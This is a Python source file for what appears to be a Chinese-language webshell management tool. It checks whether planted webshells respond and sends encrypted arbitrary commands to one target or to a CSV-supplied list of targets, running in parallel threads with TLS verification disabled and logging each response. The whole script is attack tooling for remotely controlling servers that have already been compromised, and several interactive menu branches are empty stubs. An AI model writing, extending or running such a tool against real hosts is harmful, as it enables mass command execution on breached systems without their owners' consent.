import concurrent.futures
import queue
from termcolor import colored
import requests
import csv
import argparse
from Encrypt import *
import json
import queue
import logging

def create_logger(url):
    # 创建文件处理器，文件名为URL
    filename=url.split("//")[-1].split("/")[0]
    filename="data/logs/"+filename+".log"
    # print(filename)
    file_handler = logging.FileHandler(filename)
    file_handler.setLevel(logging.INFO)
    file_handler.setFormatter(logging.Formatter('%(asctime)s %(levelname)s: %(message)s'))
    # 创建Logger对象
    logger = logging.getLogger(url)
    logger.setLevel(logging.INFO)
    logger.addHandler(file_handler)
    return logger

def banner():
    print(colored("* * * * * * * * * *","green"))
    print(colored("*","green"),colored("Webshell管理","yellow"),colored("   *","green"))
    print(colored("*","green"),colored("Author:emohack","yellow"),colored(" *","green"))
    print(colored("*","green"),colored("Version:1.0","yellow"),colored("    *","green"))
    print(colored("* * * * * * * * * *","green"))
    print("author:"+colored("emohack","yellow"))
    print("Version:1.0")
    print("Github:https://github.com/emohack/webshell.git")
    print()
def menu():
    banner()
    while True:
        print("1.单webshell")
        print("2.批量webshell")
        print("3.退出")
        option=input("option>：")
        if option=="1":
            pass
        elif option=="2":
            pass
        elif option=="3":
            exit()
        else:
            print("wrong option")
            continue

def bt_menu():
    print(colored("* * * * * * * * *","green"))
    print(colored("*","green"),colored("Webshell管理","yellow"))
    print(colored("*","green"),colored("Author:emohack","yellow"))
    print(colored("*","green"),colored("Version:1.0","yellow"))
    print(colored("* * * * * * * * *","green"))
    print("1.批量验证webshell有效")
    print("2.批量执行命令")
    print("3.退出")
    return input("请输入选项：")

class Webshell:
    def __init__(self, url,passwd,shell):
        self.logger = create_logger(url)
        with open("data/config.json", "r") as f:
            self.url = url
            if shell==None:
                self.shell=url.split(".")[-1]
            else:
                self.shell=shell
            self.passwd=passwd
            self.configs=json.loads(f.read())
            self.headers=self.configs["headers"]
            # 将文件格式转化为小写并替换为对应的密码
            verify=self.configs['verify'][self.shell.lower()]

            data=verify["data"]
            passwd=verify["PASSWD"]
            self.verify={
                self.passwd:passwd,
                "data":data
            }
            #引入加密、解密类
            self.encrypt=phpCrypt(self.passwd,self.shell)
    def Verify(self):
        try:
            response=requests.post(url=self.url,headers=self.headers,verify=False,timeout=3,data=self.verify)
            if response.status_code==200:
                print(response.text)
                print(colored("[+]","green")+f"{self.url} 连接成功")
            else:
                print(colored("[-]","red")+f"{self.url} 连接失败")
        except Exception as e:
            print(colored("[-]", "red") + f"{self.url} 连接失败")

    def command(self,cmd):
        data=self.encrypt.main(cmd)
        try:
            response=requests.post(url=self.url,headers=self.headers,verify=False,timeout=3,data=data)
            if response.status_code==200:
                print("> ",end="")
                self.logger.info(f"{self.url} 执行命令：{cmd}")
                self.logger.info(f"{self.url} 响应：\n{response.text}\n")
                print(response.text)
            else:
                print(colored("[-]","red")+f"{self.url} 执行失败")
        except Exception as e:
            self.logger.error(f"{self.url} 执行命令：{cmd}")
            self.logger.error(f"{self.url} 响应：\n{e}\n")

            print(colored("[-]", "red") + f"{self.url} 执行失败")

def idp_menu():
    banner()
    print("1.验证webshell是否有效")
    print("2.执行命令")
    print("3.退出")
    return input("请输入选项：")
def independent(url):
    pass
def batch(file):
    urls=[]
    passwds=[]
    shells=[]
    with open(file, "r") as f:
        url = csv.reader(f)
        for i in url:
            urls.append(i[0])
            passwds.append(i[1])
            if len(i) == 3:
                shells.append(i[2])
            else:
                shells.append("")
    bt_menu()
def excute(verify,url,passwd,shell,command):
    if verify:
        webshell = Webshell(url, passwd, shell)
        webshell.Verify()
    elif command:
        print(colored("[+]","green")+f"正在执行{url}的命令")
        webshell = Webshell(url, passwd,shell)
        # print(command)
        webshell.command(command)
    else:
        print(colored("[-]", "red") + "请检查参数是否正确")
        exit()

def run_in_threadpool(urls,passwds,shells,command,verify=True,num_threads=10):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        for url, passwd, shell in zip(urls, passwds, shells):
            executor.submit(excute,verify,url,passwd,shell,command)
if __name__ == '__main__':
    banner()
    argparse=argparse.ArgumentParser()
    # 选择交互模式或命令行模式 i:交互模式 b:命令行模式
    # 必须选择一个
    argparse.add_argument("-m","--mode",help="模式 (i=交互，b=命令)",choices=["i","b"],required=True)
    argparse.add_argument("-c","--command",help="命令")
    argparse.add_argument("-u","--url",help="目标url")
    argparse.add_argument("-p","--passwd",help="密码")
    argparse.add_argument("-s","--shell",help="shell类型")
    argparse.add_argument("-v","--verify",help="验证",action="store_true")
    argparse.add_argument("-f","--file",help="目标文件 csv格式([url,passwd,(shell)]")
    argparse.add_argument("-t","--threads",help="线程数 默认4",type=int,default=4)
    args=argparse.parse_args()

    # 判断模式
    # 交互模式
    if args.mode=="i":
        menu()
    # 命令行模式
    elif args.mode=="b":
        # 命令行单url
        if args.url!=None:
            if args.passwd == None:
                print(colored("[-]", "red") + "请输入密码")
                exit()
            excute(args.verify,args.url,args.passwd,args.shell,args.command)
        # 命令行批量url
        elif args.file!=None:
            urls=[]
            passwds=[]
            shells=[]
            with open(args.file,'r') as f:
                datas=f.readlines()
                for data in datas:
                    data=data.split(",")
                    urls.append(data[0])
                    passwds.append(data[1])
                    if len(data)>=3:
                        shells.append(data[2].split("\n")[0])
            run_in_threadpool(urls,passwds,shells,args.command,args.verify,args.threads)


        else:
            print(colored("[-]","red")+"请输入url或者文件")
            exit()
    else:
        print(colored("[-]","red")+"请输入正确的模式")
        exit()